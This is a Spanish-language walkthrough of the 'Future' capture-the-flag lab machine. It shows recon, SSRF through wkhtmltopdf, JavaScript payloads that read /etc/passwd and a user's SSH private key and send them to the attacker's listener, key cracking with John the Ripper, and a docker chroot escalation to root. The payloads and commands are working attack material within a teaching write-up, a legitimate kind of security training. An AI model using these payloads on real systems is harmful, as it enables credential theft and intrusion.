---
description: 'Difficulty: Medium'
---

# Future

La IP de la máquina Future en mi caso:

<figure><img src="../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

### Recon

1. Realizamos un escaneo con Nmap contra el objetivo:

```bash
sudo nmap -sCV -p- --open -T5 192.168.56.108
```

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

* Se identifica el puerto 22/tcp (SSH) y el puerto 80/tcp (Servicio HTTP) en este caso ejecutando un servidor Apache.

2. Con el puerto 80 ejecutando un servidor web Apache, el primer paso será acceder desde el navegador web a la IP:

<figure><img src="../../../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>

* Podemos añadir la IP al archivo /etc/hosts:

<figure><img src="../../../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

3. Hacemos click en el texto en el centro de la página, que primero nos muestra un video de la película de regreso al futuro y la URL cambia a /transition/index.html y una vez se completa nos lleva a 1955.html:

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

4. En el menú lateral aparecen múltiples enlaces, pero nos interesa HOMEWORK, ya que encontraremos un formulario en el que podemos subir un archivo:

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

### SSRF (Server Side Resquest Forgery)

5. Cómo el formulario nos indica que el formato del archivo tiene que ser HTML, creamos un archivo de prueba con la estructura básica HTML:

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

6. Abrimos Burp, entramos por el navegador integrado a la página del formulario, subimos el HTML de prueba y capturamos la request:

<figure><img src="../../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

7. La enviamos al Repeater para analizar mejor el comportamiento del objetivo:

<figure><img src="../../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

* Parece que recibe correctamente la request pero no procesa el archivo HTML a PDF.

8. Probaremos a ver si podemos ejecutar una conexión contra nuestro equipo atacante:

* Ponemos una consola a la escucha en el equipo atacante:

```bash
nc -vnlp 1234
```

<figure><img src="../../../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>

* Modificamos en el Repeater la request, cambiando el contenido del HTML, directamente sobre la request:

<figure><img src="../../../.gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>

* Recibimos lo siguiente, en la consola a la escucha:

<figure><img src="../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

* Nos indica que la página objetivo utiliza wkhtmltopdf para pasar los HTML a PDF, por lo que puede ser nuestro vector de ataque.

10. Modificaremos el HTML de la request en el Repeater, para intentar leer el archivo /etc/passwd:

```html
<script>
    var readfile = new XMLHttpRequest(); // Leer el archivo local
    var exfil = new XMLHttpRequest(); // Enviar el archivo a nuestro servidor
    readfile.open("GET","file:///etc/passwd", true);
    readfile.send();
    readfile.onload = function() {
        if (readfile.readyState === 4) {
            var url = 'http://192.168.56.101:1234/?data='+btoa(this.response);
            exfil.open("GET", url, true);
            exfil.send();
        }
    }
    readfile.onerror = function(){document.write('Oops!');}
</script>
```

<figure><img src="../../../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

* En la consola que tenemos a la escucha recibimos el archivo codificado en base64:

<figure><img src="../../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

11. Copiamos el texto recibido y lo decodificamos:

```bash
base64 -d base64_passwd.txt > passwd_decoded.txt
```

<figure><img src="../../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

* Identificamos los siguientes usuarios:
  * marty.mcfly
  * emmett.brown

12. Esto ha funcionado para obtener el contenido de /etc/passwd, cómo en la máquina víctima hemos visto que otro de los servicios es SSH, probaremos obtener las claves RSA de los usuarios por el mismo método. Modificamos la request en el Repeater:

```html
<script>
    var readfile = new XMLHttpRequest(); // Leer el archivo local
    var exfil = new XMLHttpRequest(); // Enviar el archivo a nuestro servidor
    readfile.open("GET","file:///home/marty.mcfly/.ssh/id_rsa", true);
    readfile.send();
    readfile.onload = function() {
        if (readfile.readyState === 4) {
            var url = 'http://192.168.56.101:1234/?data='+btoa(this.response);
            exfil.open("GET", url, true);
            exfil.send();
        }
    }
    readfile.onerror = function(){document.write('Oops!');}
</script>
```

<figure><img src="../../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

* Recibimos en la consola el contenido cifrado en base64:

<figure><img src="../../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

13. Lo copiamos y decodificamos:

```bash
base64 -d rsa_coded.txt > rsa_decoded.txt
```

<figure><img src="../../../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

14. Movemos la clave RSA a un archivo id\_rsa y le damos permisos para utilizarla:

```bash
sudo chmod +x id_rsa
```

<figure><img src="../../../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>

15. Realizaremos la conexión por SSH:

```bash
ssh -i id_rsa marty.mcfly@192.168.56.108
```

<figure><img src="../../../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>

* Pero tiene contraseña.

16. Utilizaremos John The Ripper para crackearla:

<pre class="language-bash"><code class="lang-bash"><strong>ssh2john id_rsa > hash_marty
</strong></code></pre>

<figure><img src="../../../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sshng hash_marty
```

<figure><img src="../../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

* Conseguimos crackear el hash y por lo tanto, la contraseña ssh del usuario marty.mcfly.

17. Iniciamos sesión con las credenciales que hemos obtenido:

```bash
ssh -i id_rsa marty.mcfly@192.168.56.108
```

<figure><img src="../../../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

* Verificar que el archivo **id\_rsa** pertenece al usuario con el que estamos intentando hacer la conexión, en mi caso l4nk0n3.

18. Una vez conectados, mostramos la flag de user.txt:

<figure><img src="../../../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation

19. Queda escalar privilegios, por lo que buscaremos en que tenemos permisos de ejecución cómo root:

```bash
find / -perm -4000 2>/dev/null
```

<figure><img src="../../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

20. Tenemos permisos sobre Docker, buscamos en GTFOBins ([https://gtfobins.github.io/](https://gtfobins.github.io/)) como utilizar el binario para escalar privilegios:

* En mi caso en la máquina víctima no tenía acceso a internet, así que transferí la imagen de docker alpine desde mi máquina atacante:

```bash
sudo docker pull alpine
```

<figure><img src="../../../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>

```bash
sudo docker save alpine -o alpine.tar
```

<figure><img src="../../../.gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>

* Transferimos el tar a la máquina víctima por SSH:

```bash
scp -i id_rsa alpine.tar marty.mcfly@192.168.56.108:/home/marty.mcfly/
```

<figure><img src="../../../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>

* En la máquina víctima:

<figure><img src="../../../.gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>

* Cargamos el archivo en Docker:

```bash
docker load < alpine.tar
```

<figure><img src="../../../.gitbook/assets/image (172).png" alt=""><figcaption></figcaption></figure>

21. Utilizamos el comando que hemos encontrado en GTFOBins para escalar privilegios:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

<figure><img src="../../../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

22. Navegamos por las carpetas y encontramos la flag del root:

<figure><img src="../../../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>
